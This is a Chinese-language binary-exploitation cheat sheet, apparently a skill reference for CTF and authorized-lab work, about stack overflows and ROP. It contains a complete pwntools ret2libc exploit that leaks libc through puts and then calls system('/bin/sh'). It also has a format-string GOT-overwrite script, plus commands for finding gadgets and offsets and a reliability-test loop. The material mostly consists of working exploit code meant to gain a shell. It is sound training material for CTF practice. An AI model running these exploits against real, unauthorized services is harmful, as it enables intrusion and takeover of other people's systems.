# 01 栈溢出与 ROP

> 配套 `pwn-crypto/SKILL.md`、`references/binary-exploitation.md`。
> 仅用于授权靶场；先记录 `sha256`、checksec、libc build id，再动手。

## 0. 基线与路线

```bash
sha256sum ./chall ./libc.so.6
file ./chall
pwn checksec ./chall
python Tool/scripts/pwn-check.py --file ./chall --json
readelf -hW ./chall | sed -n '1,20p'
readelf -lW ./chall | grep -E 'GNU_STACK|LOAD'
readelf -d ./chall | grep -E 'BIND_NOW|RPATH|RUNPATH|NEEDED'
ldd ./chall
```

路线选择：`NX off` → 栈 shellcode；`NX on` → ROP/ret2libc；有格式化串 → 先泄漏或任意写；
`Canary found` → 先泄漏 canary，或改走格式化串/堆；`PIE` → 先泄漏 code/libc。

**成功判据**：能说清 PIE/NX/canary/RELRO 四项，且本地 libc 与目标一致（build id 或泄漏低 12 位吻合）。
**失败判据**：只跑了 checksec、没确认 libc；或把本地基址直接用于远程。

## 1. 找偏移

```bash
pwn cyclic 300 > /tmp/pat
gdb -q ./chall -ex 'run < /tmp/pat' -ex 'info registers rip rsp' -ex 'x/4gx $rsp' -ex quit
pwn cyclic -l 0x6161616c        # 用崩溃时的 4/8 字节值替换
```

- 也可用 `pattern_create/pattern_offset`；`$rip` 必须是可识别的 cyclic 片段。
- 有 canary 时先在 `$fs_base+0x28` 观察，确认泄漏到的确实是栈上的 canary，而不是 TLS 其他字段。

**成功判据**：同一偏移重复 3 次都让 `$rip` 受控；`$rsp` 指向 payload 中预期位置。
**失败判据**：偏移随输入长度变化、`$rip` 仍是固定地址、或程序在到达 `ret` 前 abort。

## 2. ret2libc 骨架

```python
from pwn import *
context.binary = elf = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
HOST, PORT = "127.0.0.1", 1337
OFFSET = 40  # 用第 1 节结果替换
def start():
    return remote(HOST, PORT) if args.REMOTE else process(elf.path)
p = start()
rop = ROP(elf)
rop.puts(elf.got["puts"])
rop.call(elf.symbols.get("main", elf.entry))
p.sendlineafter(b"> ", flat({OFFSET: rop.chain()}))
leaked = u64(p.recvline().strip().ljust(8, b"\x00"))
assert leaked > 0x7f0000000000, "泄漏不像 libc 地址"
libc.address = leaked - libc.symbols["puts"]
assert libc.address & 0xfff == 0, "libc 基址未页对齐"
rop2 = ROP(libc)
rop2.raw(rop2.ret)  # 调用前保持 rsp % 16 == 0
rop2.call(libc.symbols["system"], [next(libc.search(b"/bin/sh\x00"))])
p.sendlineafter(b"> ", flat({OFFSET: rop2.chain()}))
p.interactive()
```

**成功判据**：泄漏值页对齐；`libc.address` 与 `vmmap` 中 libc 段一致；shell 内 `id` 有输出。
**失败判据**：泄漏为 0 或非地址；`system` 崩溃但 `puts` 正常（先查栈对齐与 libc 版本）。

## 3. gadget 不足

```bash
ROPgadget --binary ./chall --only "pop|ret" | grep -E "pop rdi ; ret|pop rsi ; ret|pop rdx ; ret"
ROPgadget --binary ./chall --only "syscall|leave|ret"
one_gadget ./libc.so.6
objdump -d ./chall | grep -A20 '<__libc_csu_init>'
```

- 缺 `pop rdx`：ret2csu（确认 `__libc_csu_init` 还在）、SROP（`rax` 可控时）、
  或 libc 内 `setcontext`。
- `one_gadget` 必须核对寄存器/栈约束，不满足会静默失败；不同 libc 偏移以本机版本为准。

**成功判据**：gdb 单步到 `ret` 时 `$rsp` 指向下一个 gadget；`$rip` 命中预期函数/gadget。
**失败判据**：`bt` 错位、`$rdi` 不是目标路径、或 gadget 落在不可执行页。

## 4. 格式化字符串

```python
from pwn import *
context.binary = elf = ELF("./chall", checksec=False)
p = process(elf.path)

p.sendline(b"AAAA." + b".%p" * 20)
print(p.recvline())  # 找到 0x41414141 的序号，64 位通常从 6 起
OFFSET = 6
payload = fmtstr_payload(
    OFFSET,
    {elf.got["printf"]: elf.symbols["win"]},  # Partial RELRO 才优先 GOT
    write_size="short",
)
p.sendline(payload)
p.interactive()
```

- 64 位地址含 `\x00`：把地址放 payload 末尾，用 `%hhn` 分字节写；先用 `%<n>$s` 验证可读。
- 每次写后读回目标地址的新值，再写第二处；大值用 `%hn`，避免输出超长被截断。

**成功判据**：目标 GOT/返回地址写后读回等于预期；连续两次写不崩；`%n` 计数与实际输出字节一致。
**失败判据**：只打印了 `%p` 没写成功；输出被截断；覆盖到了只读页。

## 5. 稳定性验收

```bash
for i in $(seq 10); do timeout 30 python3 exploit.py >/tmp/run.$i 2>&1; echo "$i $?"; done
grep -l 'uid=' /tmp/run.* | wc -l
```

**成功判据**：全新进程 ≥9/10 成功；远程拿到 shell/flag，附 `id`、路径与会话时间。
**失败判据**：偶发成功、只在 gdb 下成功、或远程与本地行为不一致且未解释。

**误报/边界**：`checksec` 的 `Canary found` 只代表编译选项，个别 leaf 函数可能没有 canary；
本地关 ASLR 的命中不能外推到远程。
